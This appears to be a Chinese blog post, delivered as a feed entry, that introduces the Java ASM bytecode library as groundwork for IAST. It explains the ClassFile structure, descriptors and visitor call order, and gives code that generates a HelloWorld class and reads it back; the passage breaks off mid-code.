    <id>https://www.sys71m.top/2022/03/23/ASM%E4%BD%BF%E7%94%A8%E5%B0%8F%E7%BB%9301/</id>
    <published>2022-03-23T14:36:53.000Z</published>
    <updated>2022-03-23T14:46:59.225Z</updated>
    
    <content type="html"><![CDATA[<p>IAST前置知识，使用ASM进行字节码增强</p><a id="more"></a>  <h2 id="ClassFile结构"><a href="#ClassFile结构" class="headerlink" title="ClassFile结构"></a>ClassFile结构</h2><ul><li><p>ASM对Class文件的操作都是基于ClassFile的文件结构，了解ClassFile文件结构有助于更好的理解ASM。</p></li><li><p>u1、u2分别代表几个字节</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ClassFile &#123;</span><br><span class="line">    u4             magic;</span><br><span class="line">    u2             minor_version;</span><br><span class="line">    u2             major_version;</span><br><span class="line">    u2             constant_pool_count;</span><br><span class="line">    cp_info        constant_pool[constant_pool_count-1];</span><br><span class="line">    u2             access_flags;</span><br><span class="line">    u2             this_class;</span><br><span class="line">    u2             super_class;</span><br><span class="line">    u2             interfaces_count;</span><br><span class="line">    u2             interfaces[interfaces_count];</span><br><span class="line">    u2             fields_count;</span><br><span class="line">    field_info     fields[fields_count];</span><br><span class="line">    u2             methods_count;</span><br><span class="line">    method_info    methods[methods_count];</span><br><span class="line">    u2             attributes_count;</span><br><span class="line">    attribute_info attributes[attributes_count];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="描述符"><a href="#描述符" class="headerlink" title="描述符"></a>描述符</h2><p>对ASM中常用的字段描述符的举例：</p><ul><li><code>boolean flag</code>: <code>Z</code></li><li><code>byte byteValue</code>: <code>B</code></li><li><code>int intValue</code>: <code>I</code></li><li><code>float floatValue</code>: <code>F</code></li><li><code>double doubleValue</code>: <code>D</code></li><li><code>String strValue</code>: <code>Ljava/lang/String;</code></li><li><code>Object objValue</code>: <code>Ljava/lang/Object;</code></li><li><code>byte[] bytes</code>: <code>[B</code></li><li><code>String[] array</code>: <code>[Ljava/lang/String;</code></li><li><code>Object[][] twoDimArray</code>: <code>[[Ljava/lang/Object;</code></li></ul><p>对方法描述符的举例：</p><ul><li><code>int add(int a, int b)</code>: <code>(II)I</code></li><li><code>void test(int a, int b)</code>: <code>(II)V</code></li><li><code>boolean compare(Object obj)</code>: <code>(Ljava/lang/Object;)Z</code></li><li><code>void main(String[] args)</code>: <code>([Ljava/lang/String;)V</code></li></ul><h2 id="ASM作用"><a href="#ASM作用" class="headerlink" title="ASM作用"></a>ASM作用</h2><ul><li><code>.java</code>文件经过javac编译为<code>.class</code>，ASM可直接对<code>.class</code>文件进行操作</li><li>ASM用来操作字节码文件，不止java语言，只要符合java字节码规范即可</li></ul><h2 id="运行方式"><a href="#运行方式" class="headerlink" title="运行方式"></a>运行方式</h2><ul><li>基于事件-核心API？</li><li>基于对象-树API？ </li></ul><h2 id="体系结构"><a href="#体系结构" class="headerlink" title="体系结构"></a>体系结构</h2><ul><li><a href="https://asm.ow2.io/javadoc/org/objectweb/asm/package-summary.html" target="_blank" rel="noopener">org.objectweb.asm</a>：包中定义类基于核心 <code>API</code> 的相关操作类；</li><li><a href="https://asm.ow2.io/javadoc/org/objectweb/asm/commons/package-summary.html" target="_blank" rel="noopener">org.objectweb.asm.commons</a>：包中提供了实用的类或方法的 <code>Adapter</code> 方法转换器；</li><li><a href="https://asm.ow2.io/javadoc/org/objectweb/asm/signature/package-summary.html" target="_blank" rel="noopener">org.objectweb.asm.signature</a>：包中重定义了泛型相关的操作类；</li><li><a href="https://asm.ow2.io/javadoc/org/objectweb/asm/tree/package-summary.html" target="_blank" rel="noopener">org.objectweb.asm.tree</a>：包中定义了基于树 <code>API</code> 的类，以及一些用于事件和树 <code>API</code> 转换的工具类；</li><li><a href="https://asm.ow2.io/javadoc/org/objectweb/asm/tree/analysis/package-summary.html" target="_blank" rel="noopener">org.objectweb.asm.tree.analysis</a>：包中提供了常见的类分析框架和分析器类；</li><li><a href="https://asm.ow2.io/javadoc/org/objectweb/asm/util/package-summary.html" target="_blank" rel="noopener">org.objectweb.asm.util</a>：包中提供了基于核心 <code>API</code> 的常见工具类。</li></ul><h2 id="ASM生成类"><a href="#ASM生成类" class="headerlink" title="ASM生成类"></a>ASM生成类</h2><h3 id="ClassVisitor类"><a href="#ClassVisitor类" class="headerlink" title="ClassVisitor类"></a>ClassVisitor类</h3><ul><li><p>一个抽象类，常见实现类-&gt;ClassWrite、ClassNode</p></li><li><p>访问者模式</p></li><li><p>有调用顺序</p><ul><li><code>[]</code>: 表示最多调用一次，可以不调用，但最多调用一次。</li><li><code>()</code>和<code>|</code>: 表示在多个方法之间，可以选择任意一个，并且多个方法之间不分前后顺序。</li><li><code>*</code>: 表示方法可以调用0次或多次。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">visit</span><br><span class="line">[visitSource][visitModule][visitNestHost][visitPermittedSubclass][visitOuterClass]</span><br><span class="line">(</span><br><span class="line"> visitAnnotation |</span><br><span class="line"> visitTypeAnnotation |</span><br><span class="line"> visitAttribute</span><br><span class="line">)*</span><br><span class="line">(</span><br><span class="line"> visitNestMember |</span><br><span class="line"> visitInnerClass |</span><br><span class="line"> visitRecordComponent |</span><br><span class="line"> visitField |</span><br><span class="line"> visitMethod</span><br><span class="line">)* </span><br><span class="line">visitEnd</span><br></pre></td></tr></table></figure></li><li><p>visit方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visit</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">final</span> <span class="keyword">int</span> version, // jdk版本</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">final</span> <span class="keyword">int</span> access, // 访问标识</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">final</span> String name, // 类名</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">final</span> String signature, // 当前类的泛型信息</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">final</span> String superName, // 当前类的父类信息</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">final</span> String[] interfaces)</span> </span>&#123; <span class="comment">// 实现接口</span></span><br><span class="line">  <span class="keyword">if</span> (api &lt; Opcodes.ASM8 &amp;&amp; (access &amp; Opcodes.ACC_RECORD) != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException(<span class="string">"Records requires ASM8"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (cv != <span class="keyword">null</span>) &#123;</span><br><span class="line">    cv.visit(version, access, name, signature, superName, interfaces);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>visitField方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> FieldVisitor <span class="title">visitField</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">final</span> <span class="keyword">int</span> access, // 访问表示</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">final</span> String name, // 字段名</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">final</span> String descriptor, // 字段描述符</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">final</span> String signature, // 泛型类型</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">final</span> Object value)</span> </span>&#123; <span class="comment">// 字段值</span></span><br><span class="line">  <span class="keyword">if</span> (cv != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> cv.visitField(access, name, descriptor, signature, value);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>visitMethod方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> MethodVisitor <span class="title">visitMethod</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">final</span> <span class="keyword">int</span> access, // 访问标识</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">final</span> String name, // 方法名</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">final</span> String descriptor, // 方法描述符</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">final</span> String signature, // 泛型类型</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">final</span> String[] exceptions)</span> </span>&#123; <span class="comment">// 异常</span></span><br><span class="line">  <span class="keyword">if</span> (cv != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> cv.visitMethod(access, name, descriptor, signature, exceptions);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="FieldVisitor类"><a href="#FieldVisitor类" class="headerlink" title="FieldVisitor类"></a>FieldVisitor类</h3><ul><li><p>一个抽象类</p></li><li><p>在<code>FieldVisitor</code>类内定义的多个<code>visitXxx()</code>方法，也需要遵循一定的调用顺序，如下所示：</p><ul><li><code>[]</code>: 表示最多调用一次，可以不调用，但最多调用一次。</li><li><code>()</code>和<code>|</code>: 表示在多个方法之间，可以选择任意一个，并且多个方法之间不分前后顺序。</li><li><code>*</code>: 表示方法可以调用0次或多次。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(</span><br><span class="line"> visitAnnotation |</span><br><span class="line"> visitTypeAnnotation |</span><br><span class="line"> visitAttribute</span><br><span class="line">)*</span><br><span class="line">visitEnd</span><br></pre></td></tr></table></figure></li></ul><h3 id="MethodVisitor类"><a href="#MethodVisitor类" class="headerlink" title="MethodVisitor类"></a>MethodVisitor类</h3><ul><li><p>一个抽象方法</p></li><li><p>遵循一定的调用顺序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(visitParameter)*</span><br><span class="line">[visitAnnotationDefault]</span><br><span class="line">(visitAnnotation | visitAnnotableParameterCount | visitParameterAnnotation | visitTypeAnnotation | visitAttribute)*</span><br><span class="line">[</span><br><span class="line">    visitCode</span><br><span class="line">    (</span><br><span class="line">        visitFrame |</span><br><span class="line">        visitXxxInsn |</span><br><span class="line">        visitLabel |</span><br><span class="line">        visitInsnAnnotation |</span><br><span class="line">        visitTryCatchBlock |</span><br><span class="line">        visitTryCatchAnnotation |</span><br><span class="line">        visitLocalVariable |</span><br><span class="line">        visitLocalVariableAnnotation |</span><br><span class="line">        visitLineNumber</span><br><span class="line">    )*</span><br><span class="line">    visitMaxs</span><br><span class="line">]</span><br><span class="line">visitEnd</span><br></pre></td></tr></table></figure></li><li><p><code>visitXxx()</code>方法分成三组：</p><ul><li>第一组，在<code>visitCode()</code>方法之前的方法。这一组的方法，主要负责parameter、annotation和attributes等内容，这些内容并不是方法当中“必不可少”的一部分；暂时不去考虑这些内容，可以忽略这一组方法。</li><li>第二组，在<code>visitCode()</code>方法和<code>visitMaxs()</code>方法之间的方法。这一组的方法，主要负责当前方法的“方法体”内的opcode内容。其中，<code>visitCode()</code>方法，标志着方法体的开始，而<code>visitMaxs()</code>方法，标志着方法体的结束。</li><li>第三组，是<code>visitEnd()</code>方法。这个<code>visitEnd()</code>方法，是最后一个进行调用的方法。</li></ul></li></ul><h3 id="ClassWriter类"><a href="#ClassWriter类" class="headerlink" title="ClassWriter类"></a>ClassWriter类</h3><p><code>ClassVistor</code>的实现类，在创建<code>ClassWriter</code>对象的时候，要指定一个<code>flags</code>参数，它可以选择的值有三个：</p><ul><li>第一个，可以选取的值是<code>0</code>。ASM不会自动计算max stacks和max locals，也不会自动计算stack map frames。</li><li>第二个，可以选取的值是<code>ClassWriter.COMPUTE_MAXS</code>。ASM会自动计算max stacks和max locals，但不会自动计算stack map frames。</li><li>第三个，可以选取的值是<code>ClassWriter.COMPUTE_FRAMES</code>（推荐使用）。ASM会自动计算max stacks和max locals，也会自动计算stack map frames。</li></ul><h3 id="FieldWriter类"><a href="#FieldWriter类" class="headerlink" title="FieldWriter类"></a>FieldWriter类</h3><p><code>FieldVisitor</code>的具体实现类，<code>FieldWriter</code>类并不带有<code>public</code>修饰，因此它的有效访问范围只局限于它所处的package当中，不能像其它的<code>public</code>类一样被外部所使用。</p><h3 id="MethodWriter类"><a href="#MethodWriter类" class="headerlink" title="MethodWriter类"></a>MethodWriter类</h3><p><code>MethodWriter</code>类的父类是<code>MethodVisitor</code>类。在<code>ClassWriter</code>类里，<code>visitMethod()</code>方法的实现就是通过<code>MethodWriter</code>类来实现的。</p><p><code>MethodWriter</code>类并不带有<code>public</code>修饰，因此它的有效访问范围只局限于它所处的package当中，不能像其它的<code>public</code>类一样被外部所使用。</p><h2 id="生成一个类"><a href="#生成一个类" class="headerlink" title="生成一个类"></a>生成一个类</h2><h3 id="生成一个HelloWorld接口"><a href="#生成一个HelloWorld接口" class="headerlink" title="生成一个HelloWorld接口"></a>生成一个HelloWorld接口</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> run;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.objectweb.asm.Opcodes.*;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.ClassWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorldGenerateCore</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = dump();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 字节码打印</span></span><br><span class="line">        BigInteger bigInteger = <span class="keyword">new</span> BigInteger(<span class="number">1</span>, bytes);</span><br><span class="line">        System.out.println(bigInteger.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过反射defineClass0方法将字节码转对象</span></span><br><span class="line">        ClassLoader classLoader = ClassLoader.getSystemClassLoader();</span><br><span class="line">        Method method = Proxy.class.getDeclaredMethod("defineClass0",ClassLoader.class, String.class, byte[].class, int.class, int.class);</span><br><span class="line">        method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object obj = method.invoke(<span class="keyword">null</span>, classLoader, <span class="string">"sample.HelloWorld"</span>, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] dump() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// (1) 创建ClassWriter对象</span></span><br><span class="line">        ClassWriter cw = <span class="keyword">new</span> ClassWriter(ClassWriter.COMPUTE_FRAMES);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// (2) 调用visitXxx()方法</span></span><br><span class="line">        cw.visit(</span><br><span class="line">                V1_8,                                        <span class="comment">// version</span></span><br><span class="line">                ACC_PUBLIC + ACC_ABSTRACT + ACC_INTERFACE,   <span class="comment">// access</span></span><br><span class="line">                <span class="string">"sample/HelloWorld"</span>,                         <span class="comment">// name</span></span><br><span class="line">                <span class="keyword">null</span>,                                        <span class="comment">// signature</span></span><br><span class="line">                <span class="string">"java/lang/Object"</span>,                          <span class="comment">// superName</span></span><br><span class="line">                <span class="keyword">null</span>                                         <span class="comment">// interfaces</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        cw.visitEnd();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// (3) 调用toByteArray()方法</span></span><br><span class="line">        <span class="keyword">return</span> cw.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="生成一个HelloWorld类"><a href="#生成一个HelloWorld类" class="headerlink" title="生成一个HelloWorld类"></a>生成一个HelloWorld类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> run;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.ClassWriter;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.MethodVisitor;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.Opcodes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorldClassGenerate</span> <span class="keyword">implements</span> <span class="title">Opcodes</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = dump();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 字节码打印</span></span><br><span class="line">        BigInteger bigInteger = <span class="keyword">new</span> BigInteger(<span class="number">1</span>, bytes);</span><br><span class="line">        System.out.println(bigInteger.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过反射defineClass0方法将字节码转对象</span></span><br><span class="line">        ClassLoader classLoader = ClassLoader.getSystemClassLoader();</span><br><span class="line">        Method method = Proxy.class.getDeclaredMethod("defineClass0",ClassLoader.class, String.class, byte[].class, int.class, int.class);</span><br><span class="line">        method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object obj = method.invoke(<span class="keyword">null</span>, classLoader, <span class="string">"sample.HelloWorld"</span>, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] dump()&#123;</span><br><span class="line">        ClassWriter cw = <span class="keyword">new</span> ClassWriter(ClassWriter.COMPUTE_FRAMES);</span><br><span class="line"></span><br><span class="line">        cw.visit(V1_8, ACC_PUBLIC+ACC_SUPER, <span class="string">"sample/HelloWorld"</span>, <span class="keyword">null</span>, <span class="string">"java/lang/Object"</span>, <span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">// 无参构造函数&lt;init&gt;</span></span><br><span class="line">        MethodVisitor mv = cw.visitMethod(ACC_PUBLIC, <span class="string">"&lt;init&gt;"</span>, <span class="string">"()V"</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">        mv.visitCode();</span><br><span class="line">        mv.visitVarInsn(ALOAD, <span class="number">0</span>);</span><br><span class="line">        mv.visitMethodInsn(INVOKESPECIAL, <span class="string">"java/lang/Object"</span>, <span class="string">"&lt;init&gt;"</span>, <span class="string">"()V"</span>, <span class="keyword">false</span>);</span><br><span class="line">        mv.visitInsn(RETURN);</span><br><span class="line">        mv.visitMaxs(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">        mv.visitEnd();</span><br><span class="line">        cw.visitEnd();</span><br><span class="line">        <span class="keyword">return</span> cw.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ASM读取类"><a href="#ASM读取类" class="headerlink" title="ASM读取类"></a>ASM读取类</h2><h3 id="ClassReader类"><a href="#ClassReader类" class="headerlink" title="ClassReader类"></a>ClassReader类</h3><ul><li><p>用于读取<code>.class</code>文件，区别于<code>ClassWriter</code></p></li><li><p>一个公共类，不继承<code>ClassVisitor</code>。</p></li><li><p>在<code>ClassReader</code>类当中定义了5个构造方法。但是，从本质上来说，这5个构造方法本质上是同一个构造方法的不同表现形式。其中，最常用的构造方法有两个</p><ul><li>第一个是<code>ClassReader cr = new ClassReader(&quot;sample.HelloWorld&quot;);</code></li><li>第二个是<code>ClassReader cr = new ClassReader(bytes);</code></li></ul></li><li><p>accept方法，这个方法接收一个<code>ClassVisitor</code>类型的参数，将<code>ClassReader</code>和<code>ClassVisitor</code>进行连接。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">accept</span><span class="params">(<span class="keyword">final</span> ClassVisitor classVisitor, <span class="keyword">final</span> <span class="keyword">int</span> parsingOptions)</span> </span>&#123;</span><br><span class="line">    accept(classVisitor, <span class="keyword">new</span> Attribute[<span class="number">0</span>], parsingOptions);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li><li><p><code>parsingOptions</code>参数可以选取的值有以下5个：</p><ul><li><code>0</code>：会生成所有的ASM代码，包括调试信息、frame信息和代码信息。</li><li><code>ClassReader.SKIP_CODE</code>：会忽略代码信息，例如，会忽略对于<code>MethodVisitor.visitXxxInsn()</code>方法的调用。</li><li><code>ClassReader.SKIP_DEBUG</code>：会忽略调试信息，例如，会忽略对于<code>MethodVisitor.visitParameter()</code>、<code>MethodVisitor.visitLineNumber()</code>和<code>MethodVisitor.visitLocalVariable()</code>等方法的调用。</li><li><code>ClassReader.SKIP_FRAMES</code>：会忽略frame信息，例如，会忽略对于<code>MethodVisitor.visitFrame()</code>方法的调用。</li><li><code>ClassReader.EXPAND_FRAMES</code>：会对frame信息进行扩展，例如，会对<code>MethodVisitor.visitFrame()</code>方法的参数有影响。</li></ul></li></ul><h2 id="读取一个类"><a href="#读取一个类" class="headerlink" title="读取一个类"></a>读取一个类</h2><h3 id="编译HelloWorld类"><a href="#编译HelloWorld类" class="headerlink" title="编译HelloWorld类"></a>编译HelloWorld类</h3><ul><li><p>编译<code>HelloWorld</code>类为Class文件，然后通过<code>ClassReader</code>读取Class文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> sample;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> <span class="keyword">extends</span> <span class="title">Exception</span> <span class="keyword">implements</span> <span class="title">Serializable</span>, <span class="title">Cloneable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="读取HelloWorld-class"><a href="#读取HelloWorld-class" class="headerlink" title="读取HelloWorld.class"></a>读取HelloWorld.class</h3><ul><li><p>使用<code>ClassReader</code>读取Class文件信息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> run;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.ClassReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorldRun</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 获取Class绝对路径</span></span><br><span class="line">        String relativePath = <span class="string">"sample/HelloWorld.class"</span>;</span><br><span class="line">        String absolutePath = HelloWorldRun.class.getResource("/").getPath() + relativePath;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 读取字节</span></span><br><span class="line">        File file = <span class="keyword">new</span> File(absolutePath);</span><br><span class="line">        InputStream inputStream = <span class="keyword">new</span> FileInputStream(file);</span><br><span 